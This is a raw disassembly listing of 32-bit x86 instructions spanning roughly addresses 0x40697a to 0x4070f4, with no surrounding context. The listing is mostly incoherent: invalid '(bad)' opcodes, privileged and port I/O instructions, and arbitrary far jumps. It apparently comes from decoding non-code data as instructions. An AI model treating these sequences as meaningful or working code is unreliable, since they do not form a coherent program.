  40697a:	imul   ebp,DWORD PTR [eax-0x7184c2f7],0xfffffff1
  406981:	je     0x406922
  406983:	cmp    BYTE PTR [edi-0x579bcf0a],al
  406989:	cs push esp
  40698b:	fstp   QWORD PTR [eax]
  40698d:	into   
  40698e:	push   ss
  40698f:	test   DWORD PTR [ecx+0x58],ebp
  406992:	fwait
  406993:	push   eax
  406994:	mov    eax,ds:0x4b9ea58
  406999:	loope  0x406a13
  40699b:	xchg   dh,al
  40699d:	xchg   esp,eax
  40699e:	dec    eax
  40699f:	pop    edx
  4069a0:	sub    eax,ecx
  4069a2:	inc    ebx
  4069a3:	push   esp
  4069a4:	sti    
  4069a5:	mov    al,0xfc
  4069a7:	or     DWORD PTR [esi+eiz*1+0x5f],ecx
  4069ab:	and    BYTE PTR [ebp-0x2432fe15],ah
  4069b1:	push   ds
  4069b2:	shl    DWORD PTR [esi],0xfb
  4069b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069b6:	in     al,0xce
  4069b8:	mov    ecx,0x4fd29451
  4069bd:	sub    eax,0x45aa4012
  4069c2:	jae    0x406976
  4069c4:	jp     0x4069d5
  4069c6:	int    0x51
  4069c8:	pop    ebx
  4069c9:	jecxz  0x4069a0
  4069cb:	dec    ebp
  4069cc:	add    bl,ah
  4069ce:	adc    al,bl
  4069d0:	xlat   BYTE PTR ds:[ebx]
  4069d1:	mov    esp,0xe3aed854
  4069d6:	xchg   ebx,eax
  4069d7:	mov    esp,0xe6c8e5c4
  4069dc:	mov    ds:0xd4071119,eax
  4069e1:	adc    al,0xb2
  4069e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069e4:	int    0x40
  4069e6:	into   
  4069e7:	mov    ebp,0xa79426e
  4069ec:	out    dx,al
  4069ed:	xor    al,0x78
  4069ef:	add    DWORD PTR [edi-0x3f3d1253],esp
  4069f5:	mov    ds:0x6719ceee,eax
  4069fa:	xchg   esp,eax
  4069fb:	scas   eax,DWORD PTR es:[edi]
  4069fc:	xchg   esp,eax
  4069fd:	mov    al,ds:0xb072c139
  406a02:	pop    ecx
  406a03:	add    BYTE PTR [ecx+0x6d0862be],0xab
  406a0a:	sbb    DWORD PTR [esi+0x61ee96f5],0x65
  406a11:	fadd   st(4),st
  406a13:	(bad)  
  406a14:	inc    esp
  406a15:	xor    DWORD PTR [eax],0x50
  406a18:	cmp    BYTE PTR [edx+0x3bc2d5e],0xbb
  406a1f:	mov    ah,0xaf
  406a21:	pushf  
  406a22:	xchg   edx,eax
  406a23:	dec    ebx
  406a24:	add    DWORD PTR ds:0x4b252e60,edx
  406a2a:	jp     0x4069de
  406a2c:	dec    eax
  406a2d:	ins    BYTE PTR es:[edi],dx
  406a2e:	out    0x82,eax
  406a30:	push   es
  406a31:	jmp    0x4069f1
  406a33:	dec    ebx
  406a34:	loop   0x406a9e
  406a36:	jmp    FWORD PTR [esi-0x35fc87d4]
  406a3c:	mov    edi,0x14ff78e9
  406a41:	adc    al,0x60
  406a43:	xchg   edx,eax
  406a44:	sahf   
  406a45:	xor    DWORD PTR [ebx+ebp*8-0x20],esi
  406a49:	in     eax,0x63
  406a4b:	pop    ss
  406a4c:	dec    ebx
  406a4d:	mov    esi,0x49678a8a
  406a52:	jae    0x4069db
  406a54:	inc    ebx
  406a55:	inc    ecx
  406a56:	loope  0x406a73
  406a58:	in     eax,dx
  406a59:	pop    esi
  406a5a:	jg     0x406a67
  406a5c:	mov    ecx,0xa473f55
  406a61:	dec    ecx
  406a62:	retf   0xe047
  406a65:	or     edx,DWORD PTR [edx+edx*4+0xe319992]
  406a6c:	mov    edx,0x5e66f06a
  406a71:	jb     0x406a1d
  406a73:	sub    DWORD PTR [ebx-0x29],edi
  406a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a77:	gs cli 
  406a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a7a:	dec    esp
  406a7b:	je     0x406aec
  406a7d:	push   ecx
  406a7e:	sub    eax,0x45de844d
  406a83:	pop    ss
  406a84:	pop    esp
  406a85:	and    ch,BYTE PTR [ebp-0x78]
  406a88:	dec    ecx
  406a89:	push   edi
  406a8a:	mov    edi,0x5d31ea40
  406a8f:	loope  0x406a8c
  406a91:	adc    DWORD PTR [edx+0x39f6a50d],esi
  406a97:	je     0x406a42
  406a99:	cdq    
  406a9a:	and    DWORD PTR [eax+ebp*1-0x44],0xbeac6f50
  406aa2:	fcomp  QWORD PTR [ebx-0x8937e0f]
  406aa8:	xchg   ecx,eax
  406aa9:	popa   
  406aaa:	(bad)  
  406aab:	ja     0x406af2
  406aad:	dec    edx
  406aae:	mov    bh,0xb7
  406ab0:	mov    ecx,0xa011c37d
  406ab5:	in     al,0xd8
  406ab7:	outs   dx,DWORD PTR ds:[esi]
  406ab8:	int3   
  406ab9:	outs   dx,DWORD PTR ds:[esi]
  406aba:	inc    ecx
  406abb:	mov    dl,0xf8
  406abd:	lds    ecx,FWORD PTR [ebx+0x6e3b267d]
  406ac3:	xchg   edx,eax
  406ac4:	imul   ecx,DWORD PTR ss:[ebp-0x2f],0xffffffdc
  406ac9:	pop    esi
  406aca:	shl    DWORD PTR [ecx],cl
  406acc:	les    eax,FWORD PTR [eax-0x5d16b876]
  406ad2:	dec    ebp
  406ad3:	hlt    
  406ad4:	cwde   
  406ad5:	xor    ebp,esp
  406ad7:	xchg   ecx,eax
  406ad8:	ret    
  406ad9:	loopne 0x406af6
  406adb:	xchg   ebx,eax
  406adc:	clc    
  406add:	lahf   
  406ade:	dec    edx
  406adf:	dec    edi
  406ae0:	ret    0x106c
  406ae3:	jns    0x406aaa
  406ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ae6:	rol    BYTE PTR [edx+0x1d],1
  406ae9:	lods   al,BYTE PTR ds:[esi]
  406aea:	xchg   BYTE PTR [ebx-0x22],al
  406aed:	data16 clc 
  406aef:	fld    TBYTE PTR [ebx+0x53]
  406af2:	xchg   ebx,eax
  406af3:	xor    dh,BYTE PTR [ebp-0x1aafed91]
  406af9:	cwde   
  406afa:	std    
  406afb:	adc    al,0xc0
  406afd:	in     al,0x3f
  406aff:	arpl   bx,bp
  406b01:	daa    
  406b02:	aas    
  406b03:	not    esi
  406b05:	(bad)  [eax+0x44]
  406b08:	pop    eax
  406b09:	scas   eax,DWORD PTR es:[edi]
  406b0a:	rcr    ch,cl
  406b0c:	mul    DWORD PTR [ebx-0x70]
  406b0f:	daa    
  406b10:	popa   
  406b11:	in     al,dx
  406b12:	scas   al,BYTE PTR es:[edi]
  406b13:	out    0x9c,al
  406b15:	rol    BYTE PTR [ebx],1
  406b17:	inc    esi
  406b18:	fwait
  406b19:	adc    DWORD PTR [edx],esp
  406b1b:	sub    BYTE PTR [ebp+0x14],dl
  406b1e:	dec    ebx
  406b1f:	stos   BYTE PTR es:[edi],al
  406b20:	and    cl,BYTE PTR [edi+0x28eeb26a]
  406b26:	ja     0x406b06
  406b28:	add    BYTE PTR [ebx],cl
  406b2a:	dec    eax
  406b2b:	add    eax,0xa61d5beb
  406b30:	popa   
  406b31:	jns    0x406b53
  406b33:	mov    BYTE PTR [eax+0x2eb6fbe0],ah
  406b39:	xor    DWORD PTR [ebx+0x30],ebx
  406b3c:	inc    edi
  406b3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b3e:	out    0xf,al
  406b40:	cmp    al,0x6d
  406b42:	sbb    eax,0x9f2eee3b
  406b47:	lds    edi,FWORD PTR [edi-0x2e]
  406b4a:	inc    ecx
  406b4b:	mov    edx,0x3a64447b
  406b50:	dec    esi
  406b51:	sub    dh,BYTE PTR [edx-0x39]
  406b54:	push   esp
  406b55:	bound  ebp,QWORD PTR [ecx+0x3cc23671]
  406b5b:	mov    ch,0xbc
  406b5d:	mov    ds:0xecc53ed7,al
  406b62:	je     0x406bc2
  406b64:	out    0x1e,al
  406b66:	inc    esp
  406b67:	(bad)  
  406b69:	fcomp  DWORD PTR [edi-0x40]
  406b6c:	(bad)  
  406b6d:	mov    edx,0xb23c3677
  406b72:	push   ebx
  406b73:	shl    BYTE PTR [esi-0x24],0x13
  406b77:	cmovns ebp,esi
  406b7a:	fcom   QWORD PTR [bp-0xe1d]
  406b7f:	xchg   esp,eax
  406b80:	mov    dh,0x8
  406b82:	div    BYTE PTR [esi]
  406b84:	test   BYTE PTR [edx],0x3d
  406b87:	aad    0x51
  406b89:	xchg   ecx,eax
  406b8a:	or     BYTE PTR [ebx+0x3eab12a4],bl
  406b90:	imul   edi,DWORD PTR [esi],0xffffff82
  406b93:	xor    eax,0x6434382e
  406b98:	sub    DWORD PTR [ebx-0x68],esp
  406b9b:	sub    bh,ch
  406b9d:	mov    ch,BYTE PTR [edi]
  406b9f:	inc    ecx
  406ba0:	fcomp  DWORD PTR [esp+ebx*2]
  406ba3:	adc    eax,0xa3ed7777
  406ba8:	jle    0x406bb4
  406baa:	sub    al,0x6
  406bac:	xor    al,0x19
  406bae:	sbb    DWORD PTR [edx],ebx
  406bb0:	ins    DWORD PTR es:[edi],dx
  406bb1:	jae    0x406b7d
  406bb3:	xchg   ebx,eax
  406bb4:	xor    DWORD PTR [esi],ebx
  406bb6:	sub    DWORD PTR [ebx],esi
  406bb8:	jg     0x406b87
  406bba:	popfw  
  406bbc:	popa   
  406bbd:	cmp    bl,BYTE PTR [eax-0x6fc05e66]
  406bc3:	sbb    al,0xdf
  406bc5:	xlat   BYTE PTR ds:[ebx]
  406bc6:	dec    esi
  406bc7:	data16 loope 0x406c43
  406bca:	cmp    cl,0xd4
  406bcd:	(bad)  
  406bce:	dec    ebx
  406bcf:	imul   ebp,DWORD PTR [ecx],0x35
  406bd2:	inc    edx
  406bd3:	mov    ch,0xc6
  406bd5:	pop    ds
  406bd6:	daa    
  406bd7:	inc    ebx
  406bd8:	inc    esi
  406bd9:	fcom   st(1)
  406bdb:	retf   
  406bdc:	pop    esi
  406bdd:	mov    bl,0x68
  406bdf:	and    al,0x8d
  406be1:	inc    esp
  406be2:	enter  0x1b20,0x46
  406be6:	sahf   
  406be7:	rcl    DWORD PTR [ebp+0x6d],cl
  406bea:	mov    bl,0xa1
  406bec:	push   ds
  406bed:	(bad)  
  406bee:	nop
  406bef:	fnclex 
  406bf1:	std    
  406bf2:	ror    BYTE PTR [ecx],cl
  406bf4:	std    
  406bf5:	mov    dl,BYTE PTR [ebp+eiz*8-0x6bb7b090]
  406bfc:	jl     0x406bfb
  406bfe:	sahf   
  406bff:	adc    esi,edx
  406c01:	jb     0x406c0b
  406c03:	call   0xe005:0x93ec618
  406c0a:	(bad)  
  406c0b:	(bad)  [ebx+0x782e0944]
  406c11:	adc    DWORD PTR [eax-0x6817f5f2],0x7b240c8c
  406c1b:	jo     0x406c01
  406c1d:	enter  0xa6d8,0xbe
  406c21:	out    dx,eax
  406c22:	(bad)  
  406c23:	(bad)  
  406c24:	cld    
  406c25:	mov    eax,ds:0x5011bbb8
  406c2a:	pushf  
  406c2b:	push   0xffffffca
  406c2d:	fisubr WORD PTR [ebx]
  406c2f:	add    dl,BYTE PTR [ebp+ebp*2-0x6beaf66d]
  406c36:	(bad)  
  406c37:	xchg   ebx,eax
  406c38:	aad    0x29
  406c3a:	(bad)  
  406c3b:	pop    esi
  406c3c:	sub    eax,0x60f67183
  406c41:	sbb    bh,BYTE PTR [ecx]
  406c43:	mov    al,ds:0xdcbfc452
  406c48:	jge    0x406c2f
  406c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c4b:	mov    edi,DWORD PTR [edx+0x55]
  406c4e:	push   ecx
  406c4f:	mov    ?,WORD PTR [eax]
  406c51:	add    BYTE PTR [eax+0x57eff14d],dh
  406c57:	xchg   edx,eax
  406c58:	clc    
  406c59:	rol    BYTE PTR [esi+ebx*2-0x45],0xcb
  406c5e:	cmp    eax,edx
  406c60:	inc    ecx
  406c61:	sub    DWORD PTR [edi-0x1606c6b6],0xe4663824
  406c6b:	loop   0x406c6f
  406c6d:	dec    ebx
  406c6e:	add    DWORD PTR [esi-0x3a855a3b],ecx
  406c74:	sub    BYTE PTR [ecx+ebp*4-0x6879a0e2],ah
  406c7b:	xor    al,0x53
  406c7d:	jp     0x406ce0
  406c7f:	loop   0x406c35
  406c81:	xchg   ecx,eax
  406c82:	inc    edi
  406c83:	and    ah,BYTE PTR [ebx+0x60cca441]
  406c89:	ins    DWORD PTR es:[edi],dx
  406c8a:	mov    DWORD PTR [eax+0x44dd2de8],eax
  406c90:	or     eax,0xc5bc0edc
  406c95:	aad    0x5d
  406c97:	cs retf 
  406c99:	inc    ebx
  406c9a:	push   ebp
  406c9b:	(bad)  
  406c9c:	out    dx,eax
  406c9d:	sub    DWORD PTR [edx],0x46
  406ca0:	frstor [edi+0x67a86db1]
  406ca6:	repnz sbb DWORD PTR [esi+0xd358b9b],0x32
  406cae:	mov    esp,ebp
  406cb0:	ret    0x95fc
  406cb3:	hlt    
  406cb4:	or     al,0x6f
  406cb6:	mov    ss,WORD PTR [ebx-0x65078ad7]
  406cbc:	xor    al,0x98
  406cbe:	jl     0x406c9b
  406cc0:	lods   eax,DWORD PTR ds:[esi]
  406cc1:	call   0x87c2f488
  406cc6:	fisttp QWORD PTR [edi-0x5f]
  406cc9:	das    
  406cca:	loopne 0x406c56
  406ccc:	jnp    0x406d1f
  406cce:	clc    
  406ccf:	inc    ebp
  406cd0:	(bad)  
  406cd2:	mov    bh,0xbf
  406cd4:	imul   edx,edi,0x50
  406cd7:	fsub   st(5),st
  406cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cda:	pop    ds
  406cdb:	jbe    0x406c8c
  406cdd:	jno    0x406d22
  406cdf:	jge    0x406ca7
  406ce1:	fs mov esi,0x3185d5e4
  406ce7:	adc    al,0x6d
  406ce9:	iret   
  406cea:	and    al,0x13
  406cec:	and    al,0x22
  406cee:	sub    DWORD PTR [eax],esp
  406cf0:	pushf  
  406cf1:	inc    ebx
  406cf2:	cmp    al,0x61
  406cf4:	rol    DWORD PTR [esi+eiz*2-0x148457ba],cl
  406cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cfc:	call   0xf10f621d
  406d01:	xchg   ecx,eax
  406d02:	mov    esi,0x9adb8bdd
  406d07:	cmp    eax,0x75a2d2d3
  406d0c:	pop    es
  406d0d:	or     dh,bl
  406d0f:	push   ecx
  406d10:	sti    
  406d11:	out    0xca,al
  406d13:	xchg   ebx,eax
  406d14:	and    al,dl
  406d16:	jb     0x406cf4
  406d18:	push   esi
  406d19:	sahf   
  406d1a:	mov    edx,0xff35a831
  406d1f:	loop   0x406d8f
  406d21:	push   cs
  406d22:	mov    dh,0xa5
  406d24:	inc    edx
  406d25:	or     BYTE PTR [eax-0x59],0x66
  406d29:	xchg   esi,eax
  406d2a:	and    eax,0xe1e14e67
  406d2f:	les    eax,FWORD PTR [edi]
  406d31:	fs ins DWORD PTR es:[edi],dx
  406d33:	jo     0x406d80
  406d35:	cli    
  406d36:	xor    al,0x58
  406d38:	add    BYTE PTR [ebx+0x56],ah
  406d3b:	add    eax,0x271b6d68
  406d40:	push   esi
  406d41:	clc    
  406d42:	mul    BYTE PTR [edi+0x2748b0f6]
  406d48:	icebp  
  406d49:	fmul   QWORD PTR [ebx-0x352fbd4c]
  406d4f:	push   edi
  406d50:	sbb    cl,BYTE PTR ds:0x22152133
  406d56:	sbb    eax,DWORD PTR [esi+0x6ded1ce8]
  406d5c:	xor    DWORD PTR [edi],eax
  406d5e:	std    
  406d5f:	lods   eax,DWORD PTR ds:[esi]
  406d60:	das    
  406d61:	mov    eax,0x1c6cce5
  406d66:	or     ah,BYTE PTR [ebp+0x1b]
  406d69:	cmp    DWORD PTR [ecx-0x2a],edx
  406d6c:	cmp    eax,0x38a66a4
  406d71:	pop    edx
  406d72:	rol    BYTE PTR [ebx+ebx*4+0x5f],cl
  406d76:	push   ecx
  406d77:	sub    al,0xb0
  406d79:	or     bh,bh
  406d7b:	(bad)  
  406d7d:	test   DWORD PTR [edx+0x206f5e9f],ebp
  406d83:	fwait
  406d84:	xchg   edx,eax
  406d85:	dec    eax
  406d86:	call   0xfbd6:0x5716469c
  406d8d:	neg    BYTE PTR [edi]
  406d8f:	cmp    eax,0xeb49cad1
  406d94:	out    0x98,eax
  406d96:	mov    DWORD PTR [ebp+0x5e],0x847efa5a
  406d9d:	xor    BYTE PTR [edi],bh
  406d9f:	into   
  406da0:	ffree  st(1)
  406da2:	mov    eax,ds:0x3db54640
  406da7:	bound  esi,QWORD PTR [ecx+0x289f7104]
  406dad:	dec    edi
  406dae:	or     BYTE PTR [ebp+0x8b82bc0],bh
  406db4:	out    0x75,al
  406db6:	fs aas 
  406db8:	xor    eax,DWORD PTR [edx]
  406dba:	out    0x71,eax
  406dbc:	push   edi
  406dbd:	jle    0x406e31
  406dbf:	lea    esi,[ebx-0x19ed2d2]
  406dc5:	dec    eax
  406dc6:	fisttp QWORD PTR [eax+ebx*2+0x5fea654e]
  406dcd:	mov    eax,0x5c4e03c7
  406dd2:	out    dx,eax
  406dd3:	in     eax,0x7e
  406dd5:	jmp    0x406e21
  406dd7:	xor    ebx,DWORD PTR [ebx]
  406dd9:	push   edi
  406dda:	cdq    
  406ddb:	pop    ecx
  406ddc:	ror    esi,0x8e
  406ddf:	pop    eax
  406de0:	fstp   QWORD PTR [ebx+0x4626373f]
  406de6:	xor    al,0x65
  406de8:	jb     0x406e63
  406dea:	mov    bh,0xf0
  406dec:	pop    ebx
  406ded:	dec    ecx
  406dee:	inc    esp
  406def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406df0:	in     eax,dx
  406df1:	cmc    
  406df2:	dec    ebx
  406df3:	push   edi
  406df4:	pusha  
  406df5:	or     al,0x4c
  406df7:	loopne 0x406e06
  406df9:	aaa    
  406dfa:	cmp    al,0xc7
  406dfc:	imul   edx,DWORD PTR [esi+0x25680a6c],0xae3577a4
  406e06:	ss aam 0x32
  406e09:	out    dx,al
  406e0a:	dec    edx
  406e0b:	inc    eax
  406e0c:	shr    cl,0xf8
  406e0f:	loopne 0x406e65
  406e11:	add    eax,0x8f8974b5
  406e16:	push   edi
  406e17:	outs   dx,BYTE PTR ds:[esi]
  406e18:	loopne 0x406dc0
  406e1a:	sahf   
  406e1b:	nop
  406e1c:	jp     0x406e12
  406e1e:	fwait
  406e1f:	adc    al,0x1e
  406e21:	add    DWORD PTR [eax-0x131be14a],0xe6df7fae
  406e2b:	ja     0x406db4
  406e2d:	add    eax,0xdd233f10
  406e32:	pop    esp
  406e33:	retf   
  406e34:	and    dl,cl
  406e36:	jge    0x406e1b
  406e38:	call   0x4054:0xa8fdcbc2
  406e3f:	xchg   ecx,eax
  406e40:	lea    esp,[ebx]
  406e42:	sub    DWORD PTR [ecx+0x42e14b99],0xffffffd8
  406e49:	jge    0x406e2c
  406e4b:	lahf   
  406e4c:	imul   esp,DWORD PTR [ecx],0xd47fc9f4
  406e52:	ja     0x406ed2
  406e54:	cld    
  406e55:	sub    bl,BYTE PTR [edx]
  406e57:	scas   eax,DWORD PTR es:[edi]
  406e58:	scas   al,BYTE PTR es:[edi]
  406e59:	out    0xb8,al
  406e5b:	fnsave [ebp+0x1a]
  406e5e:	xchg   ebp,eax
  406e5f:	push   esp
  406e60:	sahf   
  406e61:	mov    ds:0x9299c8f2,eax
  406e66:	imul   ebp,DWORD PTR [esp+ebp*1-0x5439514c],0xffffffd4
  406e6e:	sub    ch,cl
  406e70:	or     ebp,DWORD PTR [edx-0x646288e0]
  406e76:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  406e78:	pop    es
  406e79:	inc    esi
  406e7a:	mov    dl,0x27
  406e7c:	or     cl,dh
  406e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e7f:	sahf   
  406e80:	and    ecx,DWORD PTR [ebx+0x1a0d01d9]
  406e86:	imul   ecx,ebx,0xffffffc0
  406e89:	add    BYTE PTR [esi-0x75cd7595],ah
  406e8f:	jp     0x406e97
  406e91:	adc    eax,0xb757ecc5
  406e96:	pop    edi
  406e97:	pushf  
  406e98:	sub    bh,BYTE PTR [ebp-0x59885ecd]
  406e9e:	sub    esp,DWORD PTR [edx]
  406ea0:	inc    esp
  406ea1:	xchg   edx,eax
  406ea2:	add    DWORD PTR ds:0xa5c7b3a,ebp
  406ea8:	out    dx,al
  406ea9:	sbb    bh,ah
  406eab:	shl    DWORD PTR [ebx],cl
  406ead:	call   0x9051:0x211b8af9
  406eb4:	sub    al,0xbb
  406eb6:	xchg   esi,eax
  406eb7:	mov    esp,0xdfd13ea8
  406ebc:	scas   eax,DWORD PTR es:[edi]
  406ebd:	inc    ecx
  406ebe:	mov    al,ds:0x42bbde46
  406ec3:	push   ss
  406ec4:	outs   dx,DWORD PTR ds:[esi]
  406ec5:	popf   
  406ec6:	mov    edi,0x35657467
  406ecb:	cld    
  406ecc:	leave  
  406ecd:	in     eax,0xf0
  406ecf:	scas   eax,DWORD PTR es:[edi]
  406ed0:	jns    0x406f45
  406ed2:	mov    cl,0x77
  406ed4:	pushf  
  406ed5:	iret   
  406ed6:	ror    BYTE PTR [ecx+0x1a],cl
  406ed9:	jp     0x406eb1
  406edb:	icebp  
  406edc:	rcr    edi,0x48
  406edf:	sbb    dh,BYTE PTR [edi]
  406ee1:	mov    WORD PTR [edi-0x7a486cf6],?
  406ee7:	stc    
  406ee8:	addr16 jae 0x406f38
  406eeb:	fwait
  406eec:	xchg   BYTE PTR [ebp+0x2e71bd8e],ch
  406ef2:	pop    ecx
  406ef3:	and    DWORD PTR [ebx],edi
  406ef5:	popf   
  406ef6:	(bad)  
  406ef8:	add    BYTE PTR [ebp-0x7e],ah
  406efb:	shl    BYTE PTR [ebx-0x6df9dd],1
  406f01:	push   es
  406f02:	and    bh,dh
  406f04:	push   es
  406f05:	loop   0x406f26
  406f07:	imul   edx,DWORD PTR [edi+ecx*8-0x56e05a2b],0xda554a0
  406f12:	jno    0x406eec
  406f14:	or     BYTE PTR [eax-0x4217682b],al
  406f1a:	out    0x89,eax
  406f1c:	stos   DWORD PTR es:[edi],eax
  406f1d:	aam    0xb7
  406f1f:	cld    
  406f20:	sbb    al,0xc7
  406f22:	clc    
  406f23:	je     0x406ecd
  406f25:	mov    ds:0xb4ca5e2b,al
  406f2a:	jae    0x406f72
  406f2c:	mov    ebx,0xfde6a1b8
  406f31:	or     al,0x4a
  406f33:	jmp    0x469e:0xfc3f0d3
  406f3a:	inc    edx
  406f3b:	aas    
  406f3c:	add    edi,DWORD PTR [ebx]
  406f3e:	imul   ebx,DWORD PTR [ebx+0x55],0x67fe2c89
  406f45:	or     DWORD PTR [ebx],esp
  406f47:	cmp    DWORD PTR [esi-0x6f],esi
  406f4a:	or     bh,BYTE PTR [eax]
  406f4c:	ja     0x406f8d
  406f4e:	jb     0x406f96
  406f50:	stc    
  406f51:	dec    esi
  406f52:	xchg   ecx,eax
  406f53:	ret    
  406f54:	cld    
  406f55:	aas    
  406f56:	call   0xcf90a024
  406f5b:	ret    
  406f5c:	pop    ebp
  406f5d:	mov    esp,0x22f98f00
  406f62:	retf   
  406f63:	sahf   
  406f64:	xor    al,0x98
  406f66:	sub    al,0xa0
  406f68:	lods   al,BYTE PTR ds:[esi]
  406f69:	sub    BYTE PTR [edi+0x65],0xc3
  406f6d:	int3   
  406f6e:	ins    BYTE PTR es:[edi],dx
  406f6f:	ss lock mov ah,0x82
  406f73:	mov    dl,0x94
  406f75:	and    eax,DWORD PTR [ebx+0x24]
  406f78:	cmc    
  406f79:	xchg   al,ah
  406f7b:	outs   dx,BYTE PTR ds:[esi]
  406f7c:	xchg   ebp,eax
  406f7d:	adc    dl,BYTE PTR [esi-0x13]
  406f80:	adc    eax,0x94da6980
  406f85:	repnz sub esp,ecx
  406f88:	inc    edx
  406f89:	test   eax,0x193b440e
  406f8e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f90:	fwait
  406f91:	scas   al,BYTE PTR es:[edi]
  406f92:	gs pop edx
  406f94:	arpl   WORD PTR [esi+edx*4],bp
  406f97:	mov    al,0x4e
  406f99:	inc    edi
  406f9a:	mov    dl,bh
  406f9c:	jbe    0x406fe7
  406f9e:	inc    esi
  406f9f:	retf   0xa8e0
  406fa2:	dec    ebx
  406fa3:	pop    esi
  406fa4:	rol    ebx,0x64
  406fa7:	xor    ecx,esp
  406fa9:	inc    DWORD PTR [ecx]
  406fab:	inc    ecx
  406fac:	and    DWORD PTR [eax],ebp
  406fae:	das    
  406faf:	inc    ebp
  406fb0:	jae    0x40700b
  406fb2:	jecxz  0x406f95
  406fb4:	cmp    al,BYTE PTR [eax]
  406fb6:	imul   ebp
  406fb8:	in     eax,0xb3
  406fba:	mov    eax,ds:0xa995adbb
  406fbf:	scas   al,BYTE PTR es:[edi]
  406fc0:	outs   dx,DWORD PTR ds:[esi]
  406fc1:	pushf  
  406fc2:	push   edx
  406fc3:	repnz inc esp
  406fc5:	test   BYTE PTR [ecx-0x2034ffda],bl
  406fcb:	sub    DWORD PTR [ebx],0x53247f31
  406fd1:	aas    
  406fd2:	hlt    
  406fd3:	push   es
  406fd4:	inc    ebx
  406fd5:	lock js 0x407044
  406fd8:	pop    esp
  406fd9:	hlt    
  406fda:	mov    bh,BYTE PTR [esi+edi*2-0x40e86ff5]
  406fe1:	or     BYTE PTR [ebx-0x3dad13b9],ch
  406fe7:	or     DWORD PTR [edx-0x64eeb3c9],0x4ea5bbae
  406ff1:	xor    DWORD PTR [edi-0x23],ecx
  406ff4:	inc    edi
  406ff5:	pop    es
  406ff6:	and    DWORD PTR [edi],ebp
  406ff8:	stc    
  406ff9:	addr16 or edx,0x6b
  406ffd:	dec    edi
  406ffe:	dec    eax
  406fff:	mov    ah,0x19
  407001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407002:	js     0x406fb3
  407004:	sub    BYTE PTR [ebx],ch
  407006:	xor    DWORD PTR [ebp-0x32],esp
  407009:	shr    dh,1
  40700b:	pop    esp
  40700c:	push   esi
  40700d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40700e:	cmp    esp,DWORD PTR [ebx-0x4e89e4ed]
  407014:	pop    ss
  407015:	in     al,dx
  407016:	stc    
  407017:	pop    ds
  407018:	pushf  
  407019:	and    DWORD PTR [edx+0x7c],0x12
  40701d:	xor    ebx,DWORD PTR [esi]
  40701f:	xlat   BYTE PTR ds:[ebx]
  407020:	imul   ebp,DWORD PTR [eax-0x11],0xe
  407024:	stos   DWORD PTR es:[edi],eax
  407025:	test   bl,0xb7
  407028:	pop    eax
  407029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40702a:	arpl   WORD PTR [edi+0x3a3e7201],di
  407030:	mov    ecx,0xe92e9f22
  407035:	es jns 0x407067
  407038:	mov    al,ds:0xc1c4af96
  40703d:	jmp    0xe7be0afa
  407042:	aaa    
  407043:	je     0x4070b0
  407045:	ins    BYTE PTR es:[edi],dx
  407046:	cmp    DWORD PTR [ebx+0x5c],edx
  407049:	mov    al,0x7b
  40704b:	adc    ah,0x26
  40704e:	push   ds
  40704f:	aam    0x9d
  407051:	mov    dl,0x34
  407053:	stos   DWORD PTR es:[edi],eax
  407054:	push   ss
  407055:	cmp    al,0x7a
  407057:	inc    edx
  407058:	xor    DWORD PTR [ebp+0x65e7dfbe],edi
  40705e:	push   0x1c5598c9
  407063:	mov    ds:0x53ec06d7,eax
  407068:	xchg   esi,eax
  407069:	add    al,0xb1
  40706b:	adc    BYTE PTR [ecx+0x7c],bh
  40706e:	ror    DWORD PTR [edi+esi*2-0x6e],cl
  407072:	lock mov eax,0xee534aa8
  407078:	lock push 0x94e9ad2b
  40707e:	push   ebp
  40707f:	cdq    
  407080:	call   0xbb8:0xf0c8bc81
  407087:	imul   dh
  407089:	ror    BYTE PTR [ebp-0x78],0x29
  40708d:	sar    DWORD PTR [eax+0x73737d57],0x2c
  407094:	mov    BYTE PTR [eax-0x2e87f151],cl
  40709a:	test   DWORD PTR [eax],edi
  40709c:	sbb    BYTE PTR [eax-0x4a],dh
  40709f:	ins    BYTE PTR es:[edi],dx
  4070a0:	adc    BYTE PTR [esi],al
  4070a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070a3:	in     al,0x6a
  4070a5:	mov    bl,0xf4
  4070a7:	or     ebp,DWORD PTR [ebx]
  4070a9:	(bad)  
  4070aa:	loopne 0x407113
  4070ac:	inc    ecx
  4070ad:	xor    cl,dl
  4070af:	pop    eax
  4070b0:	ins    BYTE PTR es:[edi],dx
  4070b1:	fild   DWORD PTR [edi-0x5a]
  4070b4:	xor    eax,0x631a5fbd
  4070b9:	jnp    0x407137
  4070bb:	mov    ds:0x9daf8f45,eax
  4070c0:	push   eax
  4070c1:	push   esp
  4070c2:	cs pop ebp
  4070c4:	rsm    
  4070c6:	xor    BYTE PTR [esi+0x5975b5dd],al
  4070cc:	out    dx,eax
  4070cd:	adc    DWORD PTR [ecx],ebx
  4070cf:	(bad)  
  4070d1:	mov    ds:0xafd14acb,eax
  4070d6:	scas   al,BYTE PTR es:[edi]
  4070d7:	shr    BYTE PTR [edx-0x274db0f3],1
  4070dd:	or     DWORD PTR [ebx],esi
  4070df:	inc    esp
  4070e0:	jmp    DWORD PTR [ebp-0x6acb2997]
  4070e6:	fsub   QWORD PTR [ebp-0x5373e5d8]
  4070ec:	jae    0x40708a
  4070ee:	test   BYTE PTR fs:[edx-0x5d],dh
  4070f2:	dec    edx
  4070f3:	pop    ds
  4070f4:	xchg   DWORD PTR ss:[esi+ebp*4-0x6a90ea20],edx
